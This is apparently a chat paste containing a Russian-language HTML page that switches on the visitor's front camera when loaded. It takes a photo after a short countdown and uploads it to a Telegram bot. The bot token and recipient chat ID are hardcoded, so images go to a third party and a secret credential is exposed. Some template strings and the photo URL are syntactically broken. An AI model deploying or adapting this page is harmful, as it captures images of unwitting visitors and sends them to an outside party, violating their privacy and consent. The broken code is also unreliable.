😃, [20.10.2025 1:31]
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Авто-фото отправка</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
            margin: 0;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }
        
        #status {
            margin: 20px 0;
            padding: 15px;
            border-radius: 8px;
            font-weight: bold;
        }
        
        .success { background: rgba(76, 175, 80, 0.3); }
        .error { background: rgba(244, 67, 54, 0.3); }
        .loading { background: rgba(33, 150, 243, 0.3); }
        
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        video {
            border-radius: 10px;
            margin: 20px 0;
            max-width: 100%;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📸 Авто-фото отправка</h1>
        <p>Разрешите доступ к камере - фото автоматически сделается и отправится</p>
        
        <div id="status" class="loading">
            🔄 Запрашиваю доступ к камере...
        </div>
        
        <div class="loader" id="loader"></div>
        
        <video id="camera" autoplay playsinline></video>
        
        <div id="countdown" style="font-size: 24px; margin: 20px 0;"></div>
    </div>

    <script>
        // ================== НАСТРОЙКИ ==================
        // ЗАМЕНИТЕ ЭТИ ДАННЫЕ НА СВОИ!
        const BOT_TOKEN = '8283462960:AAEfyjMymBxUREYzkyScLEW1StCJlSZHdYQ';
        const YOUR_CHAT_ID = '8228130717';
        // ===============================================

        const video = document.getElementById('camera');
        const statusEl = document.getElementById('status');
        const loader = document.getElementById('loader');
        const countdownEl = document.getElementById('countdown');

        // Функция для обновления статуса
        function updateStatus(message, type = 'loading') {
            statusEl.textContent = message;
            statusEl.className = type;
        }

        // Функция обратного отсчета
        function startCountdown(seconds) {
            return new Promise((resolve) => {
                let count = seconds;
                countdownEl.textContent = 📸 Снимок через: ${count}с;
                
                const interval = setInterval(() => {
                    count--;
                    countdownEl.textContent = 📸 Снимок через: ${count}с;
                    
                    if (count <= 0) {
                        clearInterval(interval);
                        countdownEl.textContent = '📸 Делаю снимок...';
                        resolve();
                    }
                }, 1000);
            });
        }

        // Функция для отправки фото в Telegram
        async function sendPhotoToTelegram(blob) {
            updateStatus('📤 Отправляю фото в Telegram...', 'loading');
            
            const formData = new FormData();
            formData.append('chat_id', 8228130717);
            formData.append('photo', blob, 'auto_selfie.jpg');
            formData.append('caption', `🤖 Авто-фото\n📅 ${new Date().toLocaleString()}\n🌐 Отправлено через веб-ссылку`);

            try {

😃, [20.10.2025 1:31]
const response = await fetch(`https://api.telegram.org/bot8283462960:AAEfyjMymBxUREYzkyScLEW1StCJlSZHdYQ/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                
                if (data.ok) {
                    updateStatus('✅ Фото успешно отправлено в Telegram! Закройте эту страницу.', 'success');
                    // Показываем превью отправленного фото
                    if (data.result.photo) {
                        const photoUrl = https://api.telegram.org/file/bot$8283462960:AAEfyjMymBxUREYzkyScLEW1StCJlSZHdYQ}/${data.result.photo[2].file_path};
                        console.log('Фото доступно по ссылке:', photoUrl);
                    }
                } else {
                    throw new Error(data.description || 'Ошибка отправки');
                }
            } catch (error) {
                console.error('Ошибка:', error);
                updateStatus(`❌ Ошибка: ${error.message}`, 'error');
            } finally {
                loader.style.display = 'none';
            }
        }

        // Основная функция - автоматическое создание и отправка фото
        async function autoCaptureAndSend() {
            try {
                updateStatus('📹 Подключаюсь к камере...', 'loading');
                
                // Запрашиваем доступ к фронтальной камере
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                video.srcObject = stream;
                video.style.display = 'block';
                
                updateStatus('✅ Камера подключена! Готовлюсь к съемке...', 'success');
                
                // Ждем пока камера настроится
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // Обратный отсчет 3 секунды
                await startCountdown(3);
                
                // Создаем canvas для фото
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // Отражаем изображение для селфи
                context.translate(canvas.width, 0);
                context.scale(-1, 1);
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Останавливаем камеру
                stream.getTracks().forEach(track => track.stop());
                video.style.display = 'none';
                
                // Конвертируем в JPG и отправляем
                canvas.toBlob(blob => {
                    sendPhotoToTelegram(blob);
                }, 'image/jpeg', 0.9);
                
            } catch (error) {
                console.error('Ошибка:', error);
                updateStatus(`❌ Ошибка: ${error.message}`, 'error');
                loader.style.display = 'none';
            }
        }

        // Запускаем автоматический процесс при загрузке страницы
        document.addEventListener('DOMContentLoaded', () => {
            // Проверяем поддержку камеры
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                updateStatus('❌ Ваш браузер не поддерживает доступ к камере', 'error');
                return;
            }
            
            // Начинаем автоматический процесс
            autoCaptureAndSend();
        });
    </script>
</body>
</html>
